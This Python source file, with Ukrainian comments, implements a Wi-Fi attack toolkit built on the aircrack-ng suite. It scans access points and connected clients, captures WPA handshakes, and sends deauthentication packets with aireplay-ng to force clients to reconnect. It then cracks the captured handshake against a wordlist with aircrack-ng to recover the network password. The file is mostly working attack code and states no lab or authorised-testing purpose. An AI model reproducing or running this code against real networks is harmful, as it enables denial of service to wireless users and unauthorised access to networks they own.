import csv
import signal
import subprocess
import tempfile
import time
import os
from pathlib import Path
from typing import Dict, List


class API:
    """Логіка без UI: робота з інтерфейсами та сканування мереж."""

    def __init__(self) -> None:
        # Створюємо папку caps, якщо її немає
        self.caps_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "caps")
        self.result_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "result")
        
        os.makedirs(self.caps_dir, exist_ok=True)
        os.makedirs(self.result_dir, exist_ok=True)
        self.last_scan: List[Dict] = []  # кеш останнього скану

    # ────────────────────────────────────────────────
    # 1. Список Wi-Fi-інтерфейсів
    # ────────────────────────────────────────────────
    def get_wireless_devices(self) -> List[str]:
        devices: List[str] = []
        try:
            out = subprocess.check_output(["iw", "dev"], text=True, stderr=subprocess.DEVNULL)
            for line in out.splitlines():
                if line.lstrip().startswith("Interface"):
                    _, iface = line.split(None, 1)
                    devices.append(iface.strip())
        except (FileNotFoundError, subprocess.CalledProcessError):
            pass
        return devices

    # ────────────────────────────────────────────────
    # 2. Скан Wi-Fi-мереж
    # ────────────────────────────────────────────────
    def scan_network(self, interface: str, timeout: int = 6) -> List[Dict]:
        """
        Запускає airodump-ng, чекає *timeout* секунд, повертає список AP.
        Ключі словника: bssid, channel, power, encryption, ssid, first_time.
        """
        with tempfile.TemporaryDirectory() as tmpdir:
            prefix = Path(tmpdir) / "dump"
            cmd = [
                "airodump-ng",
                "--output-format",
                "csv",
                "-w",
                str(prefix),
                interface,
            ]
            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except FileNotFoundError:
                raise RuntimeError("airodump-ng not found. Install aircrack-ng.") from None

            # дати час зібрати пакети
            time.sleep(timeout)
            proc.send_signal(signal.SIGINT)  # коректно завершуємо
            proc.wait(timeout=3)

            # шукаємо CSV
            csv_path = next(Path(tmpdir).glob("dump-*.csv"), None)
            if not csv_path or not csv_path.exists():
                raise RuntimeError("airodump-ng did not produce CSV output.")

            ap_list: List[Dict] = []
            with csv_path.open(newline="", encoding="utf-8", errors="ignore") as fh:
                rdr = csv.reader(fh)
                for row in rdr:
                    if not row:
                        continue
                    if row[0].strip() == "BSSID":  # шапка AP-секції
                        continue
                    if row[0].strip().lower() == "station mac":  # дійшли до клієнтів
                        break
                    # 14+ колонок: BSSID, First time seen, Last time seen, channel ...
                    if len(row) < 14:
                        continue
                    ap_list.append(
                        {
                            "bssid": row[0].strip(),
                            "first_time": row[1].strip(),
                            "channel": row[3].strip(),
                            "power": row[8].strip(),
                            "encryption": row[5].strip(),
                            "ssid": row[13].strip(),
                        }
                    )

            self.last_scan = ap_list  # кешуємо
            return ap_list

    # ────────────────────────────────────────────────
    # 3. Інфо за BSSID
    # ────────────────────────────────────────────────
    def get_info_by_bssid(self, bssid: str) -> Dict:
        """Повернути словник із self.last_scan за вказаним BSSID."""
        for net in self.last_scan:
            if net["bssid"].lower() == bssid.lower():
                return net
        raise ValueError("BSSID not found in last scan.")

    # ────────────────────────────────────────────────
    # 4. Отримати підключених клієнтів
    # ────────────────────────────────────────────────
    def get_connected_clients(self, interface: str, timeout: int = 15) -> List[Dict]:
        """
        Запускає airodump-ng, чекає *timeout* секунд, повертає список підключених клієнтів.
        Ключі словника: station, bssid, power, packets.
        """
        with tempfile.TemporaryDirectory() as tmpdir:
            prefix = Path(tmpdir) / "clients"
            cmd = [
                "airodump-ng",
                "--output-format",
                "csv",
                "-w",
                str(prefix),
                interface,
            ]
            try:
                proc = subprocess.Popen(
                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except FileNotFoundError:
                raise RuntimeError("airodump-ng not found. Install aircrack-ng.") from None

            # дати час зібрати дані про клієнтів
            time.sleep(timeout)
            proc.send_signal(signal.SIGINT)  # коректно завершуємо
            proc.wait(timeout=3)

            # шукаємо CSV
            csv_path = next(Path(tmpdir).glob("clients-*.csv"), None)
            if not csv_path or not csv_path.exists():
                raise RuntimeError("airodump-ng did not produce CSV output.")

            clients_list: List[Dict] = []
            in_stations_section = False
            
            with csv_path.open(newline="", encoding="utf-8", errors="ignore") as fh:
                rdr = csv.reader(fh)
                for row in rdr:
                    if not row:
                        continue
                    if row[0].strip().lower() == "station mac":  # початок секції клієнтів
                        in_stations_section = True
                        continue
                    if in_stations_section and len(row) >= 6:
                        clients_list.append({
                            "station": row[0].strip(),  # MAC адреса клієнта
                            "bssid": row[5].strip(),     # MAC адреса точки доступу
                            "power": row[3].strip(),      # Потужність сигналу
                            "packets": row[4].strip(),    # Кількість пакетів
                        })

            return clients_list

    # ────────────────────────────────────────────────
    # 5. Збір рукостискань (handshake)
    # ────────────────────────────────────────────────
    def get_handshake(self, interface: str, channel: str, bssid: str, timeout: int = 120) -> str:
        """Захоплює handshake і зберігає у папці caps"""
        # Генеруємо унікальне ім'я файлу на основі часу та BSSID
        timestamp = int(time.time())
        filename = f"handshake_{bssid.replace(':', '')}_{timestamp}"
        result_path = os.path.join(self.caps_dir, filename)
        
        cmd = [
            "airodump-ng",
            "-c", channel,
            "--bssid", bssid,
            "-w", result_path,
            interface
        ]
        
        try:
            proc = subprocess.Popen(
                cmd, 
                stdout=subprocess.DEVNULL, 
                stderr=subprocess.PIPE,
                text=True
            )
        except FileNotFoundError:
            raise RuntimeError("airodump-ng not found. Install aircrack-ng.") from None

        try:
            # Чекаємо поки з'явиться handshake або вийде час
            start_time = time.time()
            while True:
                if (time.time() - start_time) > timeout:
                    proc.terminate()
                    raise RuntimeError("Не вдалося захопити handshake у вказаний час")
                
                # Перевіряємо чи є handshake у виводі
                line = proc.stderr.readline()
                if "WPA handshake" in line:
                    proc.terminate()
                    # Повертаємо шлях до .cap файлу
                    cap_file = f"{result_path}-01.cap"
                    if os.path.exists(cap_file):
                        return cap_file
                    raise RuntimeError("Файл handshake не знайдено")
                
                time.sleep(1)
                
        except Exception as e:
            proc.terminate()
            raise RuntimeError(f"Помилка під час захоплення handshake: {str(e)}")

        # ────────────────────────────────────────────────
        # 6. Деаутентифікація клієнтів
        # ────────────────────────────────────────────────
    def deauth_clients(self, interface: str, router_bssid: str, clients: List[str], 
                    count: int = 2, interval: int = 10) -> bool:
        """
        Виконує деаутентифікацію клієнтів для стимуляції handshake.
        
        Args:
            interface: мережевий інтерфейс (наприклад, 'wlan0mon')
            router_bssid: MAC-адреса точки доступу (наприклад, 'AA:BB:CC:DD:EE:FF')
            clients: список MAC-адрес клієнтів (наприклад, ['11:22:33:44:55:66'])
            count: кількість пакетів деаутентифікації на клієнта
            interval: пауза між атаками (секунди)
            
        Returns:
            bool: True якщо всі атаки успішні, False якщо були помилки
        """
        success = True
        
        for client_bssid in clients:
            cmd = [
                "aireplay-ng",
                "-0", str(count),
                "-a", str(router_bssid),  # Ensure this is a string
                "-c", str(client_bssid),  # Ensure this is a string
                str(interface)  # Ensure this is a string
            ]
            
            try:
                print(f"Відправляю {count} деаутентифікаційних пакетів до клієнта {client_bssid}...")
                subprocess.run(
                    cmd,
                    check=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=interval
                )
            except subprocess.CalledProcessError as e:
                print(f"Помилка при деаутентифікації клієнта {client_bssid}: {e.stderr}")
                success = False
            except subprocess.TimeoutExpired:
                print(f"Час виконання команди для клієнта {client_bssid} вийшов")
                success = False
            except FileNotFoundError:
                print("Помилка: aireplay-ng не знайдено. Встановіть aircrack-ng.")
                return False
            except Exception as e:
                print(f"Невідома помилка: {str(e)}")
                success = False
            
            if client_bssid != clients[-1]:  # Не чекати після останнього клієнта
                print(f"Очікую {interval} секунд перед наступною атакою...")
                time.sleep(interval)
        
        return success


    def parse_password(self, router_bssid: str, router_ssid: str) -> str:
        # Шлях до словника паролів
        wordlist_path = os.path.join(self.result_dir, f"{router_ssid}.txt")

        # Шукаємо останній .cap файл у папці caps
        cap_files = list(Path(self.caps_dir).glob("*.cap"))
        if not cap_files:
            raise FileNotFoundError("Не знайдено жодного .cap файлу для аналізу")

        # Беремо останній файл (найімовірніше, актуальний)
        latest_cap = sorted(cap_files, key=os.path.getmtime)[-1]

        cmd = [
            "aircrack-ng",
            "-a2",  # WPA crack
            "-b", router_bssid,
            "-w", wordlist_path,
            str(latest_cap)
        ]

        try:
            print("SERCHING PASSWORD...")
            result = subprocess.run(
                cmd,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=300
            )

            # Аналізуємо вивід на наявність пароля
            for line in result.stdout.split('\n'):
                if "KEY FOUND!" in line:
                    return line.split("[")[1].split("]")[0]

            return ""  # Пароль не знайдено

        except subprocess.CalledProcessError as e:
            if "Passphrase not in dictionary" in e.stderr:
                return ""  # Пароль не знайдено у словнику
            raise RuntimeError(f"Помилка aircrack-ng: {e.stderr}")
        except subprocess.TimeoutExpired:
            print("Час підбору пароля вийшов")
            return ""
        except FileNotFoundError:
            raise RuntimeError("aircrack-ng не знайдено. Встановіть aircrack-ng.")